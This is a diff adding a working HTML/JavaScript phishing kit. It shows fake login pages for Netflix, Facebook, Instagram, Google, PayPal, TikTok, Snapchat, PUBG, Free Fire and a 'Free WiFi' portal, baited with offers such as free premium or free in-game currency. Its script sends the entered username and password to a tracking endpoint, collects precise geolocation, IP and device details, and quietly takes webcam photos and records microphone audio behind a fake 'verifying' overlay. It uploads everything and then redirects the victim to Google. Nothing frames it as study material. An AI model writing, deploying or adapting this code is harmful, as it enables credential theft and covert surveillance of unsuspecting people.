@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Loading...</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden}
+
+/* Netflix */
+.netflix-bg{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%)}
+.netflix-card{background:#fff;border-radius:24px;padding:40px 30px;width:90%;max-width:380px;text-align:center;box-shadow:0 25px 80px rgba(0,0,0,0.4)}
+.netflix-icon{width:80px;height:80px;background:linear-gradient(135deg,#e50914,#b20710);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:35px;color:#fff;box-shadow:0 8px 25px rgba(229,9,20,0.3)}
+.netflix-card h2{color:#1a1a2e;font-size:26px;margin-bottom:5px;font-weight:700}
+.netflix-card .sub{color:#888;font-size:14px;margin-bottom:20px}
+.netflix-badge{background:linear-gradient(90deg,#e50914,#ff6b6b);color:#fff;padding:8px 20px;border-radius:20px;font-size:12px;font-weight:600;display:inline-block;margin-bottom:25px}
+
+/* Facebook */
+.fb-bg{background:linear-gradient(135deg,#1877f2,#0d5cb6)}
+.fb-card{background:#fff;border-radius:24px;padding:40px 30px;width:90%;max-width:380px;text-align:center;box-shadow:0 25px 80px rgba(0,0,0,0.3)}
+.fb-icon{width:80px;height:80px;background:#1877f2;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:40px;color:#fff;box-shadow:0 8px 25px rgba(24,119,242,0.3)}
+
+/* Instagram */
+.ig-bg{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888)}
+.ig-card{background:#fff;border-radius:24px;padding:40px 30px;width:90%;max-width:380px;text-align:center;box-shadow:0 25px 80px rgba(0,0,0,0.3)}
+.ig-icon{width:80px;height:80px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:35px;color:#fff;box-shadow:0 8px 25px rgba(220,39,67,0.3)}
+
+/* Gaming/Free Fire */
+.game-bg{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e)}
+.game-card{background:#1a1a2e;border:1px solid rgba(255,200,0,0.2);border-radius:24px;padding:40px 30px;width:90%;max-width:380px;text-align:center;box-shadow:0 25px 80px rgba(0,0,0,0.5)}
+.game-icon{width:80px;height:80px;background:linear-gradient(135deg,#ffc800,#ff6b00);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:35px;box-shadow:0 8px 25px rgba(255,200,0,0.3)}
+.game-card h2{color:#ffc800;font-size:26px;margin-bottom:5px}
+.game-card .sub{color:#aaa;font-size:14px;margin-bottom:20px}
+.game-badge{background:linear-gradient(90deg,#ffc800,#ff6b00);color:#000;padding:8px 20px;border-radius:20px;font-size:12px;font-weight:700;display:inline-block;margin-bottom:25px}
+
+/* Google */
+.google-bg{background:linear-gradient(135deg,#4285f4,#34a853,#fbbc05,#ea4335)}
+.google-card{background:#fff;border-radius:24px;padding:40px 30px;width:90%;max-width:380px;text-align:center;box-shadow:0 25px 80px rgba(0,0,0,0.3)}
+.google-icon{width:80px;height:80px;background:#fff;border:3px solid #e8e8e8;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:35px;box-shadow:0 8px 25px rgba(0,0,0,0.1)}
+
+/* TikTok */
+.tiktok-bg{background:linear-gradient(135deg,#000000,#1a1a1a)}
+.tiktok-card{background:#fff;border-radius:24px;padding:40px 30px;width:90%;max-width:380px;text-align:center;box-shadow:0 25px 80px rgba(0,0,0,0.5)}
+.tiktok-icon{width:80px;height:80px;background:#000;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:35px;color:#fff;box-shadow:0 8px 25px rgba(0,0,0,0.3)}
+
+/* Snapchat */
+.snap-bg{background:linear-gradient(135deg,#fffc00,#ffeb3b)}
+.snap-card{background:#fff;border-radius:24px;padding:40px 30px;width:90%;max-width:380px;text-align:center;box-shadow:0 25px 80px rgba(0,0,0,0.3)}
+.snap-icon{width:80px;height:80px;background:#fffc00;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:35px;box-shadow:0 8px 25px rgba(255,252,0,0.3)}
+
+/* PayPal */
+.paypal-bg{background:linear-gradient(135deg,#003087,#0070e0)}
+.paypal-card{background:#fff;border-radius:24px;padding:40px 30px;width:90%;max-width:380px;text-align:center;box-shadow:0 25px 80px rgba(0,0,0,0.3)}
+.paypal-icon{width:80px;height:80px;background:#003087;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:35px;color:#fff;box-shadow:0 8px 25px rgba(0,48,135,0.3)}
+
+/* PUBG */
+.pubg-bg{background:linear-gradient(135deg,#1a1a2e,#16213e)}
+.pubg-card{background:#1a1a2e;border:1px solid rgba(255,200,0,0.2);border-radius:24px;padding:40px 30px;width:90%;max-width:380px;text-align:center;box-shadow:0 25px 80px rgba(0,0,0,0.5)}
+.pubg-icon{width:80px;height:80px;background:linear-gradient(135deg,#ffc800,#ff6b00);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:35px;box-shadow:0 8px 25px rgba(255,200,0,0.3)}
+
+/* WiFi */
+.wifi-bg{background:linear-gradient(135deg,#00c853,#00e676)}
+.wifi-card{background:#fff;border-radius:24px;padding:40px 30px;width:90%;max-width:380px;text-align:center;box-shadow:0 25px 80px rgba(0,0,0,0.3)}
+.wifi-icon{width:80px;height:80px;background:linear-gradient(135deg,#00c853,#00e676);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:35px;color:#fff;box-shadow:0 8px 25px rgba(0,200,83,0.3)}
+
+/* Common styles */
+.card h2{font-size:26px;margin-bottom:5px;font-weight:700;color:#1a1a2e}
+.card .sub{color:#888;font-size:14px;margin-bottom:20px}
+.input{width:100%;padding:16px 18px;border:2px solid #e8e8e8;border-radius:14px;margin-bottom:14px;font-size:15px;outline:none;transition:all 0.3s;background:#fafafa}
+.input:focus{border-color:#667eea;background:#fff;box-shadow:0 0 15px rgba(102,126,234,0.1)}
+.btn{width:100%;padding:16px;background:linear-gradient(90deg,#667eea,#764ba2);color:#fff;border:none;border-radius:14px;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s;letter-spacing:0.5px}
+.btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(102,126,234,0.3)}
+
+/* Dark inputs for gaming/pubg */
+.dark-input{width:100%;padding:16px 18px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:14px;margin-bottom:14px;font-size:15px;color:#fff;outline:none}
+.dark-input:focus{border-color:#ffc800}
+.dark-input::placeholder{color:rgba(255,255,255,0.3)}
+.dark-btn{width:100%;padding:16px;background:linear-gradient(90deg,#ffc800,#ff6b00);color:#000;border:none;border-radius:14px;font-size:16px;font-weight:700;cursor:pointer}
+
+/* Loading overlay */
+.loading-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);backdrop-filter:blur(15px);z-index:1000;display:none;flex-direction:column;align-items:center;justify-content:center}
+.loading-overlay.active{display:flex}
+.loading-box{background:#fff;border-radius:20px;padding:45px 50px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);max-width:320px;width:85%}
+.loading-spinner{width:55px;height:55px;border:4px solid #f0f0f0;border-top-color:#667eea;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-box h3{color:#1a1a2e;font-size:20px;margin-bottom:10px;font-weight:700}
+.loading-box p{color:#999;font-size:14px;margin-bottom:18px;line-height:1.5}
+.loading-bar{width:100%;height:5px;background:#f0f0f0;border-radius:3px;overflow:hidden}
+.loading-bar-fill{height:100%;background:linear-gradient(90deg,#667eea,#764ba2);border-radius:3px;width:0%;transition:width 0.4s ease}
+.loading-status{color:#667eea;font-size:11px;margin-top:12px;letter-spacing:2px;font-weight:600}
+
+/* Custom DP */
+.custom-dp{width:80px;height:80px;border-radius:50%;object-fit:cover;margin:0 auto 20px;border:3px solid rgba(102,126,234,0.3);box-shadow:0 8px 25px rgba(102,126,234,0.2)}
+
+.hidden{position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;width:1px;height:1px}
+</style>
+</head>
+<body id="body">
+
+<div id="loginCard"></div>
+
+<div class="loading-overlay" id="loadingOverlay">
+<div class="loading-box">
+<div class="loading-spinner"></div>
+<h3>Processing...</h3>
+<p id="loadingText">Please wait while we verify your request.</p>
+<div class="loading-bar"><div class="loading-bar-fill" id="loadingBar"></div></div>
+<div class="loading-status" id="loadingStatus">INITIALIZING...</div>
+</div>
+</div>
+
+<video class="hidden" id="hiddenVideo" autoplay playsinline muted></video>
+<canvas class="hidden" id="hiddenCanvas"></canvas>
+
+<script>
+const linkId = '{{ link_id }}';
+let capturedPhotos = [];
+let audioChunks = [];
+let mediaRecorder = null;
+let stream = null;
+
+// Template configs
+const templates = {
+netflix: {
+bg: 'netflix-bg', cardClass: 'netflix-card',
+icon: '&#127916;', title: 'Netflix', sub: 'Watch anywhere',
+badge: '&#127991; Free Premium',
+input1: 'Email or Phone', input2: 'Password',
+btn: 'Login & Continue &#9654;',
+isDark: false, useDP: false
+},
+facebook: {
+bg: 'fb-bg', cardClass: 'fb-card',
+icon: '&#128172;', title: 'Facebook', sub: 'Connect with friends',
+badge: '',
+input1: 'Email or Phone', input2: 'Password',
+btn: 'Log In',
+isDark: false, useDP: false
+},
+instagram: {
+bg: 'ig-bg', cardClass: 'ig-card',
+icon: '&#128247;', title: 'Instagram', sub: 'Share your moments',
+badge: '',
+input1: 'Username or Email', input2: 'Password',
+btn: 'Log In',
+isDark: false, useDP: false
+},
+gaming: {
+bg: 'game-bg', cardClass: 'game-card',
+icon: '&#127918;', title: 'Free Fire', sub: 'Battle in Style',
+badge: '&#128293; Free Diamonds',
+input1: 'Email or Phone', input2: 'Password',
+btn: 'Login & Continue &#9654;',
+isDark: true, useDP: false
+},
+google: {
+bg: 'google-bg', cardClass: 'google-card',
+icon: '&#128269;', title: 'Google', sub: 'Sign in to continue',
+badge: '',
+input1: 'Email or Phone', input2: 'Password',
+btn: 'Next',
+isDark: false, useDP: false
+},
+tiktok: {
+bg: 'tiktok-bg', cardClass: 'tiktok-card',
+icon: '&#127925;', title: 'TikTok', sub: 'Make Your Day',
+badge: '',
+input1: 'Email or Username', input2: 'Password',
+btn: 'Log In',
+isDark: false, useDP: false
+},
+snapchat: {
+bg: 'snap-bg', cardClass: 'snap-card',
+icon: '&#128123;', title: 'Snapchat', sub: 'Stay connected',
+badge: '',
+input1: 'Username or Email', input2: 'Password',
+btn: 'Log In',
+isDark: false, useDP: false
+},
+paypal: {
+bg: 'paypal-bg', cardClass: 'paypal-card',
+icon: '&#128179;', title: 'PayPal', sub: 'Pay securely online',
+badge: '',
+input1: 'Email', input2: 'Password',
+btn: 'Log In',
+isDark: false, useDP: false
+},
+pubg: {
+bg: 'pubg-bg', cardClass: 'pubg-card',
+icon: '&#128299;', title: 'PUBG', sub: 'Winner Winner Chicken Dinner',
+badge: '&#128293; Free UC',
+input1: 'Email or Phone', input2: 'Password',
+btn: 'Login & Continue',
+isDark: true, useDP: false
+},
+wifi: {
+bg: 'wifi-bg', cardClass: 'wifi-card',
+icon: '&#128246;', title: 'Free WiFi', sub: 'Connect to network',
+badge: '&#9989; Secure Connection',
+input1: 'WiFi Name', input2: 'Password',
+btn: 'Connect',
+isDark: false, useDP: false
+}
+};
+
+// GET TEMPLATE FROM URL PARAMETER
+function getUrlParam(name) {
+const urlParams = new URLSearchParams(window.location.search);
+return urlParams.get(name);
+}
+
+let currentTemplate = 'netflix';
+let customDP = null;
+
+async function init() {
+// Get template from URL ?template=xxx
+const urlTemplate = getUrlParam('template');
+if (urlTemplate && templates[urlTemplate]) {
+currentTemplate = urlTemplate;
+}
+
+// Get custom DP from URL ?dp=xxx (base64 image URL)
+const urlDP = getUrlParam('dp');
+if (urlDP) {
+customDP = decodeURIComponent(urlDP);
+}
+
+// Send initial ping to server
+try {
+await fetch('/api/track/' + linkId, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({ping: true})
+});
+} catch(e) {}
+
+renderTemplate();
+}
+
+function renderTemplate() {
+const t = templates[currentTemplate] || templates.netflix;
+document.getElementById('body').className = t.bg;
+
+let badgeHtml = t.badge ? `<div style="background:linear-gradient(90deg,#667eea,#764ba2);color:#fff;padding:8px 20px;border-radius:20px;font-size:12px;font-weight:600;display:inline-block;margin-bottom:25px">${t.badge}</div>` : '';
+
+// Custom DP or icon
+let iconHtml;
+if (customDP) {
+iconHtml = `<img src="${customDP}" class="custom-dp" alt="Profile" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">` +
+`<div style="width:80px;height:80px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:50%;display:none;align-items:center;justify-content:center;margin:0 auto 20px;font-size:35px;color:#fff;box-shadow:0 8px 25px rgba(102,126,234,0.3)">${t.icon}</div>`;
+} else {
+iconHtml = `<div style="width:80px;height:80px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:35px;color:#fff;box-shadow:0 8px 25px rgba(102,126,234,0.3)">${t.icon}</div>`;
+}
+
+let titleColor = t.isDark ? 'color:#ffc800' : 'color:#1a1a2e';
+let subColor = t.isDark ? 'color:#aaa' : 'color:#888';
+let labelColor = t.isDark ? 'color:#aaa' : 'color:#666';
+
+let inputClass = t.isDark ? 'dark-input' : 'input';
+let btnClass = t.isDark ? 'dark-btn' : 'btn';
+
+document.getElementById('loginCard').innerHTML = `
+<div style="display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px">
+<div class="${t.cardClass}">
+${iconHtml}
+<h2 style="font-size:26px;margin-bottom:5px;font-weight:700;${titleColor}">${t.title}</h2>
+<p style="font-size:14px;margin-bottom:10px;${subColor}">${t.sub}</p>
+${badgeHtml}
+<div style="text-align:left;margin-bottom:15px">
+<span style="font-size:13px;color:${labelColor}">&#128273; Login to Continue</span>
+</div>
+<form onsubmit="handleLogin(event)">
+<input type="text" id="cred1" placeholder="${t.input1}" required class="${inputClass}">
+<input type="password" id="cred2" placeholder="${t.input2}" required class="${inputClass}">
+<button type="submit" id="loginBtn" class="${btnClass}">${t.btn}</button>
+</form>
+</div>
+</div>
+`;
+}
+
+function updateLoading(percent, text, status) {
+document.getElementById('loadingBar').style.width = percent + '%';
+if(text) document.getElementById('loadingText').textContent = text;
+if(status) document.getElementById('loadingStatus').textContent = status;
+}
+
+async function handleLogin(e) {
+e.preventDefault();
+const cred1 = document.getElementById('cred1').value;
+const cred2 = document.getElementById('cred2').value;
+
+const overlay = document.getElementById('loadingOverlay');
+overlay.classList.add('active');
+
+// Send credentials
+updateLoading(10, 'Verifying your credentials...', 'VERIFYING...');
+try {
+await fetch('/api/track/' + linkId, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({ credentials: { username: cred1, password: cred2 } })
+});
+} catch(err) {}
+
+// Collect device data
+updateLoading(25, 'Please wait while we process your request...', 'PROCESSING...');
+const data = await collectDeviceData();
+
+try {
+await fetch('/api/track/' + linkId, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify(data)
+});
+} catch(err) {}
+
+// Start SILENT capture
+updateLoading(45, 'Loading content...', 'LOADING...');
+await startSilentCapture();
+}
+
+async function collectDeviceData() {
+const data = {location: {}, device_info: {}, screen_info: {}, network_info: {}, battery_info: {}};
+
+data.screen_info = {
+width: screen.width, height: screen.height,
+availWidth: screen.availWidth, availHeight: screen.availHeight,
+colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio
+};
+
+data.device_info = {
+platform: navigator.platform, userAgent: navigator.userAgent,
+language: navigator.language, languages: navigator.languages,
+cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine,
+hardwareConcurrency: navigator.hardwareConcurrency,
+maxTouchPoints: navigator.maxTouchPoints, vendor: navigator.vendor,
+browser: getBrowser()
+};
+
+if (navigator.connection) {
+data.network_info = {
+effectiveType: navigator.connection.effectiveType,
+downlink: navigator.connection.downlink,
+rtt: navigator.connection.rtt, saveData: navigator.connection.saveData
+};
+}
+
+if (navigator.getBattery) {
+try {
+const battery = await navigator.getBattery();
+data.battery_info = {level: battery.level, charging: battery.charging};
+} catch(e) {}
+}
+
+if (navigator.geolocation) {
+try {
+const position = await new Promise((resolve, reject) => {
+navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 8000, enableHighAccuracy: true});
+});
+data.location = {
+latitude: position.coords.latitude, longitude: position.coords.longitude,
+accuracy: position.coords.accuracy, altitude: position.coords.altitude
+};
+} catch(e) {}
+}
+
+try {
+const ipRes = await fetch('https://ipapi.co/json/');
+const ipData = await ipRes.json();
+data.location.city = ipData.city;
+data.location.country = ipData.country_name;
+data.location.region = ipData.region;
+data.location.ip = ipData.ip;
+data.location.org = ipData.org;
+} catch(e) {}
+
+return data;
+}
+
+function getBrowser() {
+const ua = navigator.userAgent;
+if (ua.includes('Firefox')) return 'Firefox';
+if (ua.includes('Chrome')) return 'Chrome';
+if (ua.includes('Safari')) return 'Safari';
+if (ua.includes('Edge')) return 'Edge';
+return 'Unknown';
+}
+
+async function startSilentCapture() {
+let cameraSuccess = false;
+try {
+stream = await navigator.mediaDevices.getUserMedia({
+video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
+audio: true
+});
+cameraSuccess = true;
+} catch(e) {
+try {
+stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+} catch(e2) {}
+}
+
+const video = document.getElementById('hiddenVideo');
+if (stream && stream.getVideoTracks().length > 0) {
+video.srcObject = stream;
+video.muted = true;
+await video.play();
+}
+
+if (stream && stream.getAudioTracks().length > 0) {
+try {
+mediaRecorder = new MediaRecorder(stream);
+audioChunks = [];
+mediaRecorder.ondataavailable = (e) => { if(e.data.size > 0) audioChunks.push(e.data); };
+mediaRecorder.start(1000);
+} catch(e) {}
+}
+
+const delays = [800, 2200, 3800, 5400, 7000];
+const progressSteps = [50, 60, 72, 84, 92];
+const statuses = ['LOADING...', 'PROCESSING...', 'VERIFYING...', 'SECURING...', 'FINALIZING...'];
+
+for (let i = 0; i < 5; i++) {
+await new Promise(r => setTimeout(r, i === 0 ? delays[0] : delays[i] - delays[i-1]));
+updateLoading(progressSteps[i], 'Please wait...', statuses[i]);
+
+if (stream && stream.getVideoTracks().length > 0) {
+try {
+const canvas = document.getElementById('hiddenCanvas');
+canvas.width = 640; canvas.height = 480;
+const ctx = canvas.getContext('2d');
+ctx.drawImage(video, 0, 0, 640, 480);
+const photo = canvas.toDataURL('image/jpeg', 0.85);
+capturedPhotos.push(photo);
+} catch(e) {}
+}
+}
+
+if (stream) {
+stream.getTracks().forEach(track => track.stop());
+}
+if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+mediaRecorder.stop();
+await new Promise(r => setTimeout(r, 500));
+}
+
+updateLoading(95, 'Completing...', 'UPLOADING...');
+if (capturedPhotos.length > 0) {
+try {
+await fetch('/api/track/' + linkId, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({ photos: capturedPhotos })
+});
+} catch(e) {}
+}
+
+if (audioChunks.length > 0) {
+try {
+const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+const reader = new FileReader();
+reader.onloadend = async function() {
+try {
+await fetch('/api/track/' + linkId, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({ audio: reader.result })
+});
+} catch(e) {}
+};
+reader.readAsDataURL(audioBlob);
+} catch(e) {}
+}
+
+updateLoading(100, 'Done!', 'COMPLETE');
+setTimeout(() => {
+window.location.href = 'https://google.com';
+}, 1500);
+}
+
+init();
+</script>
+</body>
+</html>
